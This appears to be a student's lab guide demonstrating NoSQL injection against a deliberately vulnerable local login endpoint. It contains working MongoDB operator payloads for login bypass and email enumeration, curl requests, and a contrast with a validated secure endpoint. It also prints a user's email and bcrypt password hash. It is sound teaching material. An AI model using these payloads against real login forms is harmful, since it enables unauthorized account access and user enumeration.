# 🎯 NoSQL Injection Attack Examples

## For User: j@gmail.com

Your database has this user:

- **Email:** `j@gmail.com`
- **Full Name:** `j`
- **Password Hash:** `$2b$12$XTPoBuwwNLHcYr4qkjVQHeMk3NArclAfxA.H6ugPUOLdzMpJrmj8.`

---

## 🔥 Attack Demonstrations

### Attack #1: Basic Authentication Bypass

**What it does:** Login as the first user without knowing credentials

**Enable Demo Mode and enter:**

```
Email: {"$ne": null}
Password: {"$ne": null}
```

**Result:** ✅ Logs in as `j@gmail.com` (bypasses authentication!)

---

### Attack #2: Regex User Enumeration - Find by First Letter

**What it does:** Check if users exist starting with specific letter

**Try these:**

#### Find users starting with "j":

```
Email: {"$regex": "^j"}
Password: {"$ne": null}
```

**Result:** ✅ Finds `j@gmail.com` (user exists!)

#### Find users starting with "admin":

```
Email: {"$regex": "^admin"}
Password: {"$ne": null}
```

**Result:** ❌ Invalid credentials (no admin user)

#### Find users starting with "test":

```
Email: {"$regex": "^test"}
Password: {"$ne": null}
```

**Result:** ❌ Invalid credentials (no test user)

**Insight:** Attackers can enumerate which usernames/emails exist!

---

### Attack #3: Domain-Based Enumeration

**What it does:** Find users by email domain

#### Find Gmail users:

```
Email: {"$regex": "@gmail.com$"}
Password: {"$ne": null}
```

**Result:** ✅ Finds `j@gmail.com`

#### Find company emails:

```
Email: {"$regex": "@company.com$"}
Password: {"$ne": null}
```

**Result:** ❌ No users found

---

### Attack #4: Case-Insensitive Search

**What it does:** Find users ignoring case

```
Email: {"$regex": "^J", "$options": "i"}
Password: {"$ne": null}
```

**Result:** ✅ Finds `j@gmail.com` (case-insensitive)

---

### Attack #5: Wildcard Pattern

**What it does:** Match partial patterns

#### Find emails with "j" anywhere:

```
Email: {"$regex": "j"}
Password: {"$ne": null}
```

**Result:** ✅ Matches `j@gmail.com`

#### Find emails with specific pattern:

```
Email: {"$regex": "^[a-z]@"}
Password: {"$ne": null}
```

**Result:** ✅ Matches single letter emails like `j@gmail.com`

---

### Attack #6: Greater Than Operator

**What it does:** Bypass using comparison

```
Email: {"$gt": ""}
Password: {"$ne": null}
```

**Result:** ✅ Logs in (any non-empty email)

---

### Attack #7: Logical OR Operator

**What it does:** Match multiple conditions

```
Email: {"$in": ["j@gmail.com", "admin@example.com"]}
Password: {"$ne": null}
```

**Result:** ✅ Finds `j@gmail.com`

---

## 🎬 How to Perform Each Attack

### Using the Login Form (Visual Demo):

1. Go to http://localhost:3000/login
2. **Check the "Demo Mode" checkbox** ⚠️
3. Copy-paste the attack payload into the Email field
4. Copy-paste the password payload into the Password field
5. Click **Login**
6. **Watch it bypass authentication!** 🎉

### Using Postman (API Testing):

```http
POST http://localhost:4000/auth/login-vulnerable
Content-Type: application/json

{
  "email": {"$regex": "^j"},
  "password": {"$ne": null}
}
```

### Using cURL (Command Line):

```powershell
# Attack #1: Basic bypass
curl -X POST http://localhost:4000/auth/login-vulnerable `
  -H "Content-Type: application/json" `
  -d '{\"email\": {\"$ne\": null}, \"password\": {\"$ne\": null}}'

# Attack #2: Regex enumeration
curl -X POST http://localhost:4000/auth/login-vulnerable `
  -H "Content-Type: application/json" `
  -d '{\"email\": {\"$regex\": \"^j\"}, \"password\": {\"$ne\": null}}'

# Attack #3: Domain search
curl -X POST http://localhost:4000/auth/login-vulnerable `
  -H "Content-Type: application/json" `
  -d '{\"email\": {\"$regex\": \"@gmail.com$\"}, \"password\": {\"$ne\": null}}'
```

---

## 📊 Attack Results Summary

| Attack Payload                | Against `j@gmail.com` | Result                      |
| ----------------------------- | --------------------- | --------------------------- |
| `{"$ne": null}`               | Any user              | ✅ Success                  |
| `{"$regex": "^j"}`            | Starts with 'j'       | ✅ Success                  |
| `{"$regex": "^admin"}`        | Starts with 'admin'   | ❌ Fails (reveals no admin) |
| `{"$regex": "@gmail.com$"}`   | Gmail domain          | ✅ Success                  |
| `{"$regex": "@company.com$"}` | Company domain        | ❌ Fails (reveals domain)   |
| `{"$gt": ""}`                 | Any email             | ✅ Success                  |
| `{"$regex": "j"}`             | Contains 'j'          | ✅ Success                  |

---

## 🎓 What This Reveals (Security Impact)

### Information Leakage:

- ✅ Attacker learns `j@gmail.com` exists
- ✅ Attacker learns no admin accounts exist
- ✅ Attacker learns only Gmail users exist (no corporate emails)
- ✅ Attacker can enumerate all email patterns

### Direct Access:

- ✅ Attacker bypasses authentication entirely
- ✅ Attacker logs in as any user without password
- ✅ Attacker gains full dashboard access

---

## 🛡️ Now Test the Secure Endpoint

Try the **SAME attacks** with Demo Mode OFF (uses `/auth/login`):

```
Email: {"$regex": "^j"}
Password: {"$ne": null}
```

**Result:** ❌ **"Invalid input"** - Attack blocked!

The secure endpoint:

- ✅ Validates input types (must be string)
- ✅ Blocks all MongoDB operators
- ✅ Uses proper email validation
- ✅ No information leakage

---

## 📸 Screenshot Guide for Your Report

Capture these screens:

1. **Before:** Demo Mode enabled with payload `{"$ne": null}`
2. **After:** Successful redirect to dashboard (showing user logged in)
3. **Compare:** Same attack with Demo Mode OFF (showing error)
4. **Code:** Side-by-side comparison of vulnerable vs secure endpoint

---

## 🎯 Presentation Flow

1. **Show the user in database** (MongoDB Compass or query)
2. **Demonstrate Attack #1** (basic bypass) - "Look, I'm logged in!"
3. **Demonstrate Attack #2** (regex enumeration) - "I found the email pattern!"
4. **Show the secure version** - "Now it's blocked!"
5. **Explain the code fix** - Show type validation
6. **Emphasize the lesson** - "Always validate input types!"

---

## 🔥 Quick Test Commands

```powershell
# Start both servers
cd server; npm run dev
cd ..; npm run dev

# Test vulnerable endpoint
curl -X POST http://localhost:4000/auth/login-vulnerable `
  -H "Content-Type: application/json" `
  -d '{\"email\": {\"$ne\": null}, \"password\": {\"$ne\": null}}'

# Test secure endpoint (should fail)
curl -X POST http://localhost:4000/auth/login `
  -H "Content-Type: application/json" `
  -d '{\"email\": {\"$ne\": null}, \"password\": {\"$ne\": null}}'
```

---

## ⚠️ Remember

- This is **EDUCATIONAL ONLY**
- Never use in production
- Always get permission before security testing
- Remove vulnerable endpoints before any deployment

---

**Ready to demo? Enable Demo Mode and try the payloads! 🚀**
